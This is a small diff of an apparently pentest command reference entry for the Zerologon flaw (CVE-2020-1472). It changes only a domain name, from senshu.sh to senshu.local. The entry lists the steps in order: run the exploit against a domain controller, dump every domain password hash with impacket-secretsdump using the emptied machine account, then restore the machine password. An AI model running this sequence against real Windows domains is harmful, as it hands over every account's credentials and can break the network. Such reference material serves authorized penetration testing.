@@ -11,12 +11,12 @@ commands:
       python3 cve-2020-1472-exploit.py DC01 10.10.10.27
 
       # Dump all domain hashes using empty machine account password
-      impacket-secretsdump -just-dc -no-pass senshu.sh/'DC01$'@10.10.10.27
+      impacket-secretsdump -just-dc -no-pass senshu.local/'DC01$'@10.10.10.27
 
       # IMPORTANT: Restore the machine account password after exploitation
       # Failing to restore will break AD replication and services
       # Use the DC machine hash obtained from secretsdump to restore:
-      python3 restorepassword.py senshu.sh/DC01@DC01 -target-ip 10.10.10.27 -hexpass ORIGINAL_HEX_PASSWORD
+      python3 restorepassword.py senshu.local/DC01@DC01 -target-ip 10.10.10.27 -hexpass ORIGINAL_HEX_PASSWORD
 phase:
   - Exploitation
 target_os:
